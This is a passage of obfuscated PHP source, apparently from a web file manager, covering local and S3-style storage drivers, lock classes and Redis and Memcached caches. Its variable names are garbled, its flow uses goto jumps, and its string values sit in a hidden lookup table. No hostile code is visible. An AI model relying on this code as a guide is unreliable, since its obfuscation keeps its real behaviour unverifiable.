$ËÒ¼ƒÔ¤); } } goto B‹„“œ¾Ìµ; B•¦‚ÂÇ‡³: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¿ü¨Ó„) { if (substr($¿ü¨Ó„, 0, 2) == $_SERVER[°‰†òö¯][1409]) { $¿ü¨Ó„ = BASIC_PATH . substr($¿ü¨Ó„, 2); } return $¿ü¨Ó„; } public function iconvApp($ÉŞ®™µ˜) { $ÃçÉº©† =& $_SERVER[°‰†òö¯]; global $config; return $this->iconvTo($ÉŞ®™µ˜, $config[$ÃçÉº©†[1438]], $config[$ÃçÉº©†[1437]]); } public function iconvSystem($€ÏÀ²Ôš) { $ßùÓ­¹¢ =& $_SERVER[°‰†òö¯]; global $config; return $this->iconvTo($€ÏÀ²Ôš, $config[$ßùÓ­¹¢[1437]], $config[$ßùÓ­¹¢[1438]]); } public function getPathOuter($ø•“ùŒ‡) { $£¤½Ô°Ò =& $_SERVER[°‰†òö¯]; $‹éÓ‡µá = $this->iconvApp($this->pathBase); $ø•“ùŒ‡ = $this->iconvApp($ø•“ùŒ‡); if (substr($‹éÓ‡µá, 0, 2) == $£¤½Ô°Ò[1409]) { $‹éÓ‡µá = BASIC_PATH . substr($‹éÓ‡µá, 2); } if (substr($ø•“ùŒ‡, 0, 2) == $£¤½Ô°Ò[1409]) { $ø•“ùŒ‡ = BASIC_PATH . substr($ø•“ùŒ‡, 2); } $‹éÓ‡µá = KodIO::clear($‹éÓ‡µá); $ø•“ùŒ‡ = KodIO::clear($ø•“ùŒ‡); $ø•“ùŒ‡ = substr($ø•“ùŒ‡, strlen($‹éÓ‡µá)); if (empty($this->pathDriver)) { return $ø•“ùŒ‡; } return $this->pathDriver . $£¤½Ô°Ò[8] . ltrim($ø•“ùŒ‡, $£¤½Ô°Ò[8]); } public function mkfile($¸‰õáˆ, $îÏÈæ©ø = '', $¹û‘Á’à = REPEAT_RENAME) { $¸‰õáˆ = $this->iconvSystem($¸‰õáˆ); @touch($¸‰õáˆ); if ($îÏÈæ©ø) { file_put_contents($¸‰õáˆ, $îÏÈæ©ø); } @chmod($¸‰õáˆ, $this->pathAuth); if (is_file($¸‰õáˆ)) { return $this->getPathOuter($¸‰õáˆ); } $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } public function mkdir($ä¤¢”¤¤, $§äÇÙşİ = REPEAT_SKIP) { $ä¤¢”¤¤ = $this->iconvSystem($ä¤¢”¤¤); if (is_dir($ä¤¢”¤¤)) { return $this->getPathOuter($ä¤¢”¤¤); } @mkdir($ä¤¢”¤¤, $this->pathAuth, !0); @chmod($ä¤¢”¤¤, $this->pathAuth); if (is_dir($ä¤¢”¤¤)) { return $this->getPathOuter($ä¤¢”¤¤); } $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } public function copyFile($öóõ“›Î, $·Š‚ë–) { $this->mkdir($this->pathFather($·Š‚ë–)); $öóõ“›Î = $this->iconvSystem($öóõ“›Î); $·Š‚ë– = $this->iconvSystem($·Š‚ë–); $Ş¶²‚ÅÒ = copy_64($öóõ“›Î, $·Š‚ë–); @chmod($·Š‚ë–, $this->pathAuth); if ($Ş¶²‚ÅÒ) { return $this->getPathOuter($·Š‚ë–); } $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } public function moveFile($º²¾ıªé, $ı©„£éò) { $this->mkdir($this->pathFather($ı©„£éò)); $º²¾ıªé = $this->iconvSystem($º²¾ıªé); $ı©„£éò = $this->iconvSystem($ı©„£éò); $ÏÕ¦ßêá = intval(@rename($º²¾ıªé, $ı©„£éò)); if (!$ÏÕ¦ßêá) { if ($ÏÕ¦ßêá = intval(@copy_64($º²¾ıªé, $ı©„£éò))) { @unlink($º²¾ıªé); } } @chmod($ı©„£éò, $this->pathAuth); if ($ÏÕ¦ßêá) { return $this->getPathOuter($ı©„£éò); } $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } public function movePath($İ›ÉèÒ, $¬¬êß», $ÖëÙƒï  = false) { $Ïßëñ·Ÿ =& $_SERVER[°‰†òö¯]; $İ›ÉèÒ = $this->iconvSystem($İ›ÉèÒ); $¬¬êß» = $this->iconvSystem($¬¬êß»); $ÆÀ±ëë¯ = rtrim($¬¬êß», $Ïßëñ·Ÿ[8]) . $Ïßëñ·Ÿ[8] . ($ÖëÙƒï  ? $ÖëÙƒï  : get_path_this($İ›ÉèÒ)); if (file_exists($ÆÀ±ëë¯)) { return !1; } $íÊ„¨ı¶ = intval(@rename($İ›ÉèÒ, $ÆÀ±ëë¯)); $íÊ„¨ı¶ = file_exists($ÆÀ±ëë¯); if ($íÊ„¨ı¶) { return $this->getPathOuter($ÆÀ±ëë¯); } $this->writeLog(__FUNCTION__ . $Ïßëñ·Ÿ[1449], !0); return !1; } public function delFile($ç½êé‡Ã) { $ç½êé‡Ã = $this->iconvSystem($ç½êé‡Ã); if (!@unlink($ç½êé‡Ã)) { @chmod($ç½êé‡Ã, $this->pathAuth); if (@unlink($ç½êé‡Ã)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } return !0; } public function delFolder($ÜÌ®×£) { $Ï«’ ˆ =& $_SERVER[°‰†òö¯]; $ÜÌ®×£ = $this->iconvSystem($ÜÌ®×£); if (!is_dir($ÜÌ®×£)) { return !0; } if (!($¹¤şı„º = opendir($ÜÌ®×£))) { return !1; } while (($† ›Œ = readdir($¹¤şı„º)) !== !1) { if ($† ›Œ == $Ï«’ ˆ[10] || $† ›Œ == $Ï«’ ˆ[1361]) { continue; } $Ñ¢³ùÁ = $ÜÌ®×£ . $Ï«’ ˆ[8] . $† ›Œ; if (is_file($Ñ¢³ùÁ) || is_link($Ñ¢³ùÁ)) { if (!unlink($Ñ¢³ùÁ)) { chmod($Ñ¢³ùÁ, $this->pathAuth); if (!unlink($Ñ¢³ùÁ)) { return !1; } } } else { if (is_dir($Ñ¢³ùÁ)) { chmod($Ñ¢³ùÁ, $this->pathAuth); $Ñ¢³ùÁ = $this->iconvApp($Ñ¢³ùÁ); if (!$this->delFolder($Ñ¢³ùÁ)) { return !1; } } } } closedir($¹¤şı„º); return rmdir($ÜÌ®×£); } public function rename($à“ŸŞ•Ú, $ïÜÀ·Ò) { $×åŞ¦ÂÜ =& $_SERVER[°‰†òö¯]; $¬æ—÷¤™ = $this->fileNameAuto($this->pathFather($à“ŸŞ•Ú), $ïÜÀ·Ò); $¬æ—÷¤™ = $this->iconvSystem($¬æ—÷¤™); $à“ŸŞ•Ú = $this->iconvSystem($à“ŸŞ•Ú); $È»ß¶Ç½ = $this->pathFather($à“ŸŞ•Ú); $àÉú–ú‹ = rtrim($È»ß¶Ç½, $×åŞ¦ÂÜ[8]) . $×åŞ¦ÂÜ[8] . $¬æ—÷¤™; $²ı··ÈÉ = @rename($à“ŸŞ•Ú, $àÉú–ú‹); $àÉú–ú‹ = $this->iconvApp($àÉú–ú‹); if ($²ı··ÈÉ) { return $this->getPathOuter($àÉú–ú‹); } $this->writeLog(__FUNCTION__ . $×åŞ¦ÂÜ[1449], !0); return !1; } public function size($ÅøàğŠ¥) { $ÅøàğŠ¥ = $this->iconvSystem($ÅøàğŠ¥); return filesize_64($ÅøàğŠ¥); } public function info($ê‡û˜Ğ¦) { $ê‡û˜Ğ¦ = $this->iconvSystem($ê‡û˜Ğ¦); if ($this->isFolder($ê‡û˜Ğ¦)) { return $this->folderInfo($ê‡û˜Ğ¦); } else { if ($this->isFile($ê‡û˜Ğ¦)) { return $this->fileInfo($ê‡û˜Ğ¦); } } return !1; } protected function infoChildren($Ö©ç”íä, &$¾˜‘ƒâù, $´Ü®´‘Ä = true) { $”Ù¦à÷ =& $_SERVER[°‰†òö¯]; check_abort_echo(); $Ö©ç”íä = rtrim($Ö©ç”íä, $”Ù¦à÷[8]) . $”Ù¦à÷[8]; if ($´Ü®´‘Ä) { $Ö©ç”íä = $this->iconvSystem($Ö©ç”íä); } if (!($à³êÒÖÁ = @opendir($Ö©ç”íä))) { return; } while (($…´Ïè© = readdir($à³êÒÖÁ)) !== !1) { if ($…´Ïè© == $”Ù¦à÷[10] || $…´Ïè© == $”Ù¦à÷[1361]) { continue; } $·¥™æ¯ = $Ö©ç”íä . $…´Ïè©; if (is_file($·¥™æ¯) || is_link($·¥™æ¯)) { $¾˜‘ƒâù[$”Ù¦à÷[80]]++; $¾˜‘ƒâù[$”Ù¦à÷[79]] += filesize_64($·¥™æ¯); } else { if (is_dir($·¥™æ¯)) { $¾˜‘ƒâù[$”Ù¦à÷[81]]++; $this->infoChildren($·¥™æ¯, $¾˜‘ƒâù, !1); } } } closedir($à³êÒÖÁ); } private function folderInfo($£õ¸Œ Õ, $Ÿ‹Òäª = false) { $‹…›ıî =& $_SERVER[°‰†òö¯]; $£õ¸Œ Õ = rtrim($£õ¸Œ Õ, $‹…›ıî[8]) . $‹…›ıî[8]; $óã²™ò¸ = $this->iconvApp($this->pathThis($£õ¸Œ Õ)); if ($Ÿ‹Òäª) { return array($‹…›ıî[32] => $óã²™ò¸, $‹…›ıî[87] => $this->getPathOuter($£õ¸Œ Õ), $‹…›ıî[33] => $‹…›ıî[78]); } $Õ–ÁÁ¡Ú = array($‹…›ıî[32] => $óã²™ò¸, $‹…›ıî[87] => $this->getPathOuter($£õ¸Œ Õ), $‹…›ıî[33] => $‹…›ıî[78], $‹…›ıî[233] => @filectime($£õ¸Œ Õ), $‹…›ıî[88] => @filemtime($£õ¸Œ Õ), $‹…›ıî[1453] => @fileatime($£õ¸Œ Õ), $‹…›ıî[1454] => is_readable($£õ¸Œ Õ), $‹…›ıî[1455] => is_writable($£õ¸Œ Õ), $‹…›ıî[1456] => get_mode($£õ¸Œ Õ)); return $Õ–ÁÁ¡Ú; } private function fileInfo($êƒÌ©µ—, $à‡ÃêÏ¨ = false) { $ü°‘­Àº =& $_SERVER[°‰†òö¯]; $¦ìÉº’Æ = $this->iconvApp($this->pathThis($êƒÌ©µ—)); if ($à‡ÃêÏ¨) { return array($ü°‘­Àº[32] => $¦ìÉº’Æ, $ü°‘­Àº[87] => $this->getPathOuter($êƒÌ©µ—), $ü°‘­Àº[33] => $ü°‘­Àº[232], $ü°‘­Àº[79] => $this->size($êƒÌ©µ—), $ü°‘­Àº[169] => $this->ext($¦ìÉº’Æ)); } $„¤êÜÚ = array($ü°‘­Àº[32] => $¦ìÉº’Æ, $ü°‘­Àº[87] => $this->getPathOuter($êƒÌ©µ—), $ü°‘­Àº[33] => $ü°‘­Àº[232], $ü°‘­Àº[233] => @filectime($êƒÌ©µ—), $ü°‘­Àº[88] => @filemtime($êƒÌ©µ—), $ü°‘­Àº[1453] => @fileatime($êƒÌ©µ—), $ü°‘­Àº[79] => $this->size($êƒÌ©µ—), $ü°‘­Àº[169] => $this->ext($¦ìÉº’Æ), $ü°‘­Àº[1454] => is_readable($êƒÌ©µ—), $ü°‘­Àº[1455] => is_writable($êƒÌ©µ—), $ü°‘­Àº[1456] => get_mode($êƒÌ©µ—)); return $„¤êÜÚ; } public function exist($È¬á„í) { $È¬á„í = $this->iconvSystem($È¬á„í); return @file_exists($È¬á„í); } public function isFile($¾æİİí) { $¾æİİí = $this->iconvSystem($¾æİİí); return @is_file($¾æİİí); } public function isFolder($È×ÇŞº ) { $È×ÇŞº  = $this->iconvSystem($È×ÇŞº ); return @is_dir($È×ÇŞº ); } public function listPath($ŸÇÈ«ÒÜ, $’å§ü¨ = false) { $Í¾˜çêÛ =& $_SERVER[°‰†òö¯]; $ŸÇÈ«ÒÜ = $this->iconvSystem($ŸÇÈ«ÒÜ); $ŸÇÈ«ÒÜ = rtrim($ŸÇÈ«ÒÜ, $Í¾˜çêÛ[8]) . $Í¾˜çêÛ[8]; $ë—ÆÕ– = array($Í¾˜çêÛ[85] => array(), $Í¾˜çêÛ[86] => array()); if (!($²Ñ’ö‘æ = @opendir($ŸÇÈ«ÒÜ))) { return $ë—ÆÕ–; } while (($Ü¬¦ğ• = readdir($²Ñ’ö‘æ)) !== !1) { if ($Ü¬¦ğ• == $Í¾˜çêÛ[10] || $Ü¬¦ğ• == $Í¾˜çêÛ[1361]) { continue; } $‹ğÃÑæ× = $ŸÇÈ«ÒÜ . $Ü¬¦ğ•; if (is_file($‹ğÃÑæ×)) { $ë—ÆÕ–[$Í¾˜çêÛ[86]][] = $this->fileInfo($‹ğÃÑæ×, $’å§ü¨); } else { $ë—ÆÕ–[$Í¾˜çêÛ[85]][] = $this->folderInfo($‹ğÃÑæ×, $’å§ü¨); } } closedir($²Ñ’ö‘æ); return $ë—ÆÕ–; } public function listAll($Û‹˜ø°‡, &$¢œÛÊöä = array()) { $Ûş¾ÜèŠ =& $_SERVER[°‰†òö¯]; $Û‹˜ø°‡ = $this->iconvSystem($Û‹˜ø°‡); $Û‹˜ø°‡ = rtrim($Û‹˜ø°‡, $Ûş¾ÜèŠ[8]) . $Ûş¾ÜèŠ[8]; if (!($°…Å = @opendir($Û‹˜ø°‡))) { return $¢œÛÊöä; } while (($’––›÷¶ = readdir($°…Å)) !== !1) { if ($’––›÷¶ == $Ûş¾ÜèŠ[10] || $’––›÷¶ == $Ûş¾ÜèŠ[1361]) { continue; } $äˆŸ¹àí = $Û‹˜ø°‡ . $’––›÷¶; $ôû±¯À­ = is_dir($äˆŸ¹àí) && !is_link($äˆŸ¹àí) ? 1 : 0; $äˆŸ¹àí = $ôû±¯À­ ? $äˆŸ¹àí . $Ûş¾ÜèŠ[8] : $äˆŸ¹àí; $¢œÛÊöä[] = array($Ûş¾ÜèŠ[87] => $this->getPathOuter($äˆŸ¹àí), $Ûş¾ÜèŠ[78] => $ôû±¯À­, $Ûş¾ÜèŠ[88] => intval(@filemtime($äˆŸ¹àí)), $Ûş¾ÜèŠ[79] => $ôû±¯À­ ? 0 : intval($this->size($äˆŸ¹àí))); if ($ôû±¯À­) { $this->listAll($äˆŸ¹àí, $¢œÛÊöä); } } closedir($°…Å); return $¢œÛÊöä; } public function has($ÄÄ¼æ¥, $±ı¥šÚ‹ = false, $è—İı‘ç = true) { $„ÌŸ›÷¾ =& $_SERVER[°‰†òö¯]; $ÄÄ¼æ¥ = $this->iconvSystem($ÄÄ¼æ¥); $ÄÄ¼æ¥ = rtrim($ÄÄ¼æ¥, $„ÌŸ›÷¾[8]) . $„ÌŸ›÷¾[8]; if (!($‹¨Ñ¿ = @opendir($ÄÄ¼æ¥))) { return !1; } $„üâ®É¤ = 0; $¾ï±àæ = 0; $‡ş»Îò£ = 0; while (($ˆœàÜÊ = readdir($‹¨Ñ¿)) !== !1) { if ($ˆœàÜÊ == $„ÌŸ›÷¾[10] || $ˆœàÜÊ == $„ÌŸ›÷¾[1361]) { continue; } $•÷‡äãÖ = $ÄÄ¼æ¥ . $ˆœàÜÊ; if ($±ı¥šÚ‹) { $‡ş»Îò£++; if (@is_file($•÷‡äãÖ)) { $„üâ®É¤++; } else { $¾ï±àæ++; } if ($‡ş»Îò£ > 10000) { break; } continue; } if ($è—İı‘ç) { if (@is_file($•÷‡äãÖ)) { return !0; } } else { if (@is_dir($•÷‡äãÖ . $„ÌŸ›÷¾[8])) { return !0; } } } closedir($‹¨Ñ¿); if ($±ı¥šÚ‹) { return array($„ÌŸ›÷¾[241] => $„üâ®É¤, $„ÌŸ›÷¾[242] => $¾ï±àæ); } return !1; } public function hashSimple($°è¶Ğ£Ş) { $Ê¬Ñ±²‰ =& $_SERVER[°‰†òö¯]; if (!$°è¶Ğ£Ş) { return md5($Ê¬Ñ±²‰[12]); } $°è¶Ğ£Ş = $this->iconvSystem($°è¶Ğ£Ş); $˜ïÏ’ôş = $this->size($°è¶Ğ£Ş); $Í†”Ï¤¼ = 200; $ÔßÇœÜû = 50; if ($˜ïÏ’ôş <= $Í†”Ï¤¼ * $ÔßÇœÜû) { return $this->hashMd5($°è¶Ğ£Ş) . $˜ïÏ’ôş; } $èòñşş˜ = $Ê¬Ñ±²‰[12]; $úìöŒ¦ù = intval($˜ïÏ’ôş / $ÔßÇœÜû); $—“ìæƒ‚ = fopen($°è¶Ğ£Ş, $Ê¬Ñ±²‰[1457]); if (!$—“ìæƒ‚) { return $èòñşş˜; } for ($•Ø­Ñ¨¦ = 0; $•Ø­Ñ¨¦ < $ÔßÇœÜû; $•Ø­Ñ¨¦++) { fseek_64($—“ìæƒ‚, $úìöŒ¦ù * $•Ø­Ñ¨¦); $èòñşş˜ .= fread($—“ìæƒ‚, $Í†”Ï¤¼); } fseek_64($—“ìæƒ‚, $˜ïÏ’ôş - $Í†”Ï¤¼); $èòñşş˜ .= fread($—“ìæƒ‚, $Í†”Ï¤¼); fclose($—“ìæƒ‚); return md5($èòñşş˜) . $˜ïÏ’ôş; } public function getContent($–˜ĞøË) { $–˜ĞøË = $this->iconvSystem($–˜ĞøË); return file_get_contents($–˜ĞøË); } public function setContent($í‡Ó™Ù£, $¸»ï²€ = '') { $í‡Ó™Ù£ = $this->iconvSystem($í‡Ó™Ù£); $Âİˆƒİ¬ = @file_put_contents($í‡Ó™Ù£, $¸»ï²€, LOCK_EX); if (!$Âİˆƒİ¬) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); } clearstatcache(); @chmod($í‡Ó™Ù£, $this->pathAuth); return $Âİˆƒİ¬ === !1 ? !1 : !0; } public function fileSubstr($Îœ™¹úŒ, $óÆ‚ôÆ¼ = 0, $Ë«Şİü„ = false) { $““»¬×× =& $_SERVER[°‰†òö¯]; $Îœ™¹úŒ = $this->iconvSystem($Îœ™¹úŒ); if ($Ë«Şİü„ === !1) { $Ë«Şİü„ = $this->size($Îœ™¹úŒ); } if ($Ë«Şİü„ <= 0) { return $““»¬××[12]; } $·ÅÄÅÃ• = fopen($Îœ™¹úŒ, $““»¬××[1457]); if (!$·ÅÄÅÃ•) { return !1; } fseek_64($·ÅÄÅÃ•, $óÆ‚ôÆ¼); $²´êŞ×ã = fread($·ÅÄÅÃ•, $Ë«Şİü„); fclose($·ÅÄÅÃ•); if (!$²´êŞ×ã) { $this->writeLog(__FUNCTION__ . $““»¬××[1449], !0); } return $²´êŞ×ã; } public function upload($ÆÇ¸ã¨ù, $ı†Š–àí, $ñ¿·’ = false, $Ã¦¶Ï€ = REPEAT_REPLACE) { if ($ñ¿·’) { return $this->moveFile($ı†Š–àí, $ÆÇ¸ã¨ù); } return $this->copyFile($ı†Š–àí, $ÆÇ¸ã¨ù); } public function setModifyTime($œç–éÑ, $Ú”ÓŸğ = '') { @touch($œç–éÑ, intval($Ú”ÓŸğ)); } public function download($í‘•Áò–, $ùæÅÌ÷¤) { return $this->iconvSystem($í‘•Áò–); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($£à¹İ«×) { parent::__construct($£à¹İ«×); $this->setSignVersion($_SERVER[°‰†òö¯][249]); } public function fileOutImage($”½¢¼¡Ò, $±Å¥áÔé = 250) { $›Å¼Ë³à =& $_SERVER[°‰†òö¯]; if ($this->size($”½¢¼¡Ò) > 1024 * 1024 * 25) { return $this->fileOutImageServer($”½¢¼¡Ò, $±Å¥áÔé); } $ÏÚ¼Í™± = array($›Å¼Ë³à[1458] => $›Å¼Ë³à[1459] . $±Å¥áÔé . $›Å¼Ë³à[1460]); $ÓØßÖ…» = $this->link($”½¢¼¡Ò, $ÏÚ¼Í™±); $this->fileOutLink($ÓØßÖ…»); } public function fileOutLink($†’ÅÃ–à) { $óå£öÊ =& $_SERVER[°‰†òö¯]; if (substr($†’ÅÃ–à, 0, 7) == $óå£öÊ[218]) { $†’ÅÃ–à = $óå£öÊ[219] . substr($†’ÅÃ–à, 7); } header($óå£öÊ[175] . $†’ÅÃ–à); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ş¹ù±±‚) { parent::__construct($ş¹ù±±‚); $this->setSignVersion($_SERVER[°‰†òö¯][249]); } public function fileOutLink($Üü­ß“®) { $åïî®ç‰ =& $_SERVER[°‰†òö¯]; if (substr($Üü­ß“®, 0, 7) == $åïî®ç‰[218]) { $Üü­ß“® = $åïî®ç‰[219] . substr($Üü­ß“®, 7); } header($åïî®ç‰[175] . $Üü­ß“®); die; } public function uploadFormData($å™í§äí, $Ò±òâ = 3600) { return $this->uploadFormDataV2($å™í§äí, $Ò±òâ); } } goto E™ë¢Æ…»Ù; CÄÏèù›: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $½‹ï‰‰— =& $_SERVER[°‰†òö¯]; $“Ô½¬±¤ = $GLOBALS[$½‹ï‰‰—[6]][$½‹ï‰‰—[426]]; self::$cachePath = $“Ô½¬±¤[$½‹ï‰‰—[232]][$½‹ï‰‰—[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Çøğ£Å„, $‚ø»ÛºÙ = 0) { $Ú³£ÍÄŸ =& $_SERVER[°‰†òö¯]; $²òÃ›¢‘ = microtime(!0); $•‡ƒ©ÇŸ = $²òÃ›¢‘ + $‚ø»ÛºÙ + 0.0001; $Éùî×« = rtrim(self::$cachePath, $Ú³£ÍÄŸ[8]) . $Ú³£ÍÄŸ[931] . md5($Çøğ£Å„) . $Ú³£ÍÄŸ[928]; if (file_exists($Éùî×«) && filemtime($Éùî×«) && filemtime($Éùî×«) < time() - 10) { @unlink($Éùî×«); } do { if (file_exists($Éùî×«)) { cacheLockWait(); continue; } $È÷Êº = fopen($Éùî×«, $Ú³£ÍÄŸ[932]); if (!$È÷Êº) { return !1; } $Ì–âèŠÎ = flock($È÷Êº, LOCK_EX | LOCK_NB); self::$caches[$Çøğ£Å„] = array($Ú³£ÍÄŸ[933] => $È÷Êº, $Ú³£ÍÄŸ[232] => $Éùî×«); fwrite($È÷Êº, $•‡ƒ©ÇŸ); clearstatcache(); if ($È÷Êº && $Ì–âèŠÎ) { return !0; } cacheLockWait(); } while (microtime(!0) < $•‡ƒ©ÇŸ); $this->unlock($Çøğ£Å„); return !1; } public function lockGet($ÏÜ´ëş²) { $Š‹Ş¬¸ =& $_SERVER[°‰†òö¯]; $¼¦—ù‰è = rtrim(self::$cachePath, $Š‹Ş¬¸[8]) . $Š‹Ş¬¸[931] . md5($ÏÜ´ëş²) . $Š‹Ş¬¸[928]; return file_exists($¼¦—ù‰è); } public function unlock($Íõ—Œøü) { $ı¡ç°¦º =& $_SERVER[°‰†òö¯]; $æú‹ışó = self::$caches[$Íõ—Œøü]; if (!$æú‹ışó) { return; } @flock($æú‹ışó[$ı¡ç°¦º[933]], LOCK_UN); @fclose($æú‹ışó[$ı¡ç°¦º[933]]); @unlink($æú‹ışó[$ı¡ç°¦º[232]]); unset(self::$caches[$Íõ—Œøü]); } } class CacheLockRedis { public function lock($ Í¹äï‰, $¢üÏ²¢¼ = 10) { $áÌŠéŠ“ = Cache::init(); $òœïë“· = microtime(!0) + $¢üÏ²¢¼; while (microtime(!0) < $òœïë“·) { $ø‹¡ï‘ = $áÌŠéŠ“->get($ Í¹äï‰); if (!$ø‹¡ï‘) { $ÉÉŸ†ƒù = $áÌŠéŠ“->setLock($ Í¹äï‰, $òœïë“·, $¢üÏ²¢¼); if ($ÉÉŸ†ƒù) { return !0; } } else { if ($ø‹¡ï‘ < microtime(!0)) { $áÌŠéŠ“->set($ Í¹äï‰, $òœïë“·, $¢üÏ²¢¼ * 2); if ($áÌŠéŠ“->get($ Í¹äï‰) === $ø‹¡ï‘) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($’”ôìÒ) { return Cache::init()->get($’”ôìÒ); } public function unlock($õà‹——Ê) { return Cache::init()->remove($õà‹——Ê); } } class CacheLockMemcached { public function lock($öºààÉá, $ˆ„Çç¾‘ = 0) { $†€ÀåÜŒ = Cache::init(); $˜¤°¨éß = microtime(!0) + $ˆ„Çç¾‘; while (microtime(!0) < $˜¤°¨éß) { $ ºÂŸ·Ú = $†€ÀåÜŒ->get($öºààÉá); if (!$ ºÂŸ·Ú || $ ºÂŸ·Ú < microtime(!0)) { $–£Æ…ìï = $†€ÀåÜŒ->handle->add($öºààÉá, $˜¤°¨éß, $ˆ„Çç¾‘); if ($–£Æ…ìï) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ê¦ôàŒû) { return Cache::init()->get($ê¦ôàŒû); } public function unlock($¾é¡ŠÕÆ) { return Cache::init()->remove($¾é¡ŠÕÆ); } } goto Fçˆë‰‘Ì¿; Fçˆë‰‘Ì¿: class CacheLockDatabase { public function lock($âÄ×å, $Ü«­†î¹ = 0) { $¶œ·ô— = Model($_SERVER[°‰†òö¯][895]); $‘»°’‹ = microtime(!0) + $Ü«­†î¹; while (microtime(!0) < $‘»°’‹) { $óÔ‹ ãá = $¶œ·ô—->get($âÄ×å); if (!$óÔ‹ ãá || $óÔ‹ ãá < microtime(!0)) { $Îìû¾ = $¶œ·ô—->set($âÄ×å, $‘»°’‹); if ($Îìû¾) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÙÔÈˆúÉ) { return Model($_SERVER[°‰†òö¯][895])->get($ÙÔÈˆúÉ); } public function unlock($ß›ÁÛÅ) { Model($_SERVER[°‰†òö¯][895])->remove($ß›ÁÛÅ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÄˆÂÇì, $–Ùñ¤Ñ€) { $ïö„¸±å =& $_SERVER[°‰†òö¯]; if (!class_exists($ïö„¸±å[934])) { show_json($ïö„¸±å[935], !1); } $this->cacheTime = $–Ùñ¤Ñ€; $this->handle = new Memcached(); if (is_array($ÄˆÂÇì[$ïö„¸±å[936]]) && count($ÄˆÂÇì[$ïö„¸±å[936]]) >= 1) { foreach ($ÄˆÂÇì[$ïö„¸±å[936]] as $Äø¨Ò™À) { $¤×¬¨×€ = explode($ïö„¸±å[4], $Äø¨Ò™À); $this->handle->addServer($¤×¬¨×€[0], $¤×¬¨×€[1]); } } else { $this->handle->addServer($ÄˆÂÇì[$ïö„¸±å[208]], $ÄˆÂÇì[$ïö„¸±å[209]]); } } public function set($æÄÃ€ºã, $·Ì÷Æì, $©ÒÄ·¹ø = false) { $©ÒÄ·¹ø = $©ÒÄ·¹ø ? $©ÒÄ·¹ø : $this->cacheTime; return $this->handle->set($æÄÃ€ºã, $·Ì÷Æì, $©ÒÄ·¹ø); } public function get($É‡ê¶î×) { return $this->handle->get($É‡ê¶î×); } public function remove($‚ìï¯´) { return $this->handle->delete($‚ìï¯´); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($­®…¤´°, $€¶Ìû™£) { $ğæ²èâ =& $_SERVER[°‰†òö¯]; if (!class_exists($ğæ²èâ[937])) { show_json($ğæ²èâ[938], !1); } $this->cacheTime = $€¶Ìû™£; $œˆÓİ‚ = isset($­®…¤´°[$ğæ²èâ[939]]) ? $­®…¤´°[$ğæ²èâ[939]] : 10; $Í¸“á£ = _get($­®…¤´°, $ğæ²èâ[936]); if ($Í¸“á£ && is_array($Í¸“á£)) { $this->initCluster($­®…¤´°, $œˆÓİ‚); } else { $this->handle = $this->init($­®…¤´°, $œˆÓİ‚); } } private function init($ËÃìæ, $„ëõ·ç¥) { $¡å¸«’ =& $_SERVER[°‰†òö¯]; $“¼‡•©Ñ = new Redis(); $ê¾¤ğ = isset($ËÃìæ[$¡å¸«’[940]]) ? $ËÃìæ[$¡å¸«’[940]] : !1; if ($ê¾¤ğ) { $“¼‡•©Ñ->pconnect($ËÃìæ[$¡å¸«’[208]], $ËÃìæ[$¡å¸«’[209]], $„ëõ·ç¥); } else { $“¼‡•©Ñ->connect($ËÃìæ[$¡å¸«’[208]], $ËÃìæ[$¡å¸«’[209]], $„ëõ·ç¥); } if (!empty($ËÃìæ[$¡å¸«’[489]])) { $“¼‡•©Ñ->auth($ËÃìæ[$¡å¸«’[489]]); } if (!empty($ËÃìæ[$¡å¸«’[818]]) && $ËÃìæ[$¡å¸«’[818]] != 0) { $“¼‡•©Ñ->select($ËÃìæ[$¡å¸«’[818]]); } return $“¼‡•©Ñ; } private function initCluster($¤æ‚‰, $å·é˜×¶) { $¢’•‘ë© =& $_SERVER[°‰†òö¯]; $—Ã‚›Ë° = array($¢’•‘ë©[941], $¢’•‘ë©[942], $¢’•‘ë©[943]); $½“ÀÖ¢ = $¢’•‘ë©[941]; if (isset($¤æ‚‰[$¢’•‘ë©[16]]) && in_array($¤æ‚‰[$¢’•‘ë©[16]], $—Ã‚›Ë°)) { $½“ÀÖ¢ = $¤æ‚‰[$¢’•‘ë©[16]]; } switch ($½“ÀÖ¢) { case $¢’•‘ë©[941]: $this->_slave($¤æ‚‰, $å·é˜×¶); break; case $¢’•‘ë©[942]: break; case $¢’•‘ë©[943]: $this->isCluster = !0; $Ø¬Åš€œ = $¤æ‚‰[$¢’•‘ë©[936]]; $–‚ºäš¢ = isset($¤æ‚‰[$¢’•‘ë©[940]]) ? $¤æ‚‰[$¢’•‘ë©[940]] : !1; $³ş»ğ¨ = isset($¤æ‚‰[$¢’•‘ë©[489]]) ? $¤æ‚‰[$¢’•‘ë©[489]] : null; $this->handle = new RedisCluster(NUll, $Ø¬Åš€œ, $å·é˜×¶, $å·é˜×¶, $–‚ºäš¢, $³ş»ğ¨); break; default: break; } } private function _slave($§¾ÉÍ“, $ğïÜá¢¨) { $ÅÚÁĞıÏ = $§¾ÉÍ“[$_SERVER[°‰†òö¯][936]]; $this->filterConfig($§¾ÉÍ“, $ÅÚÁĞıÏ[0]); $this->handle = $this->init($§¾ÉÍ“, $ğïÜá¢¨); unset($ÅÚÁĞıÏ[0]); if (empty($ÅÚÁĞıÏ)) { return; } $ÓŠççì = 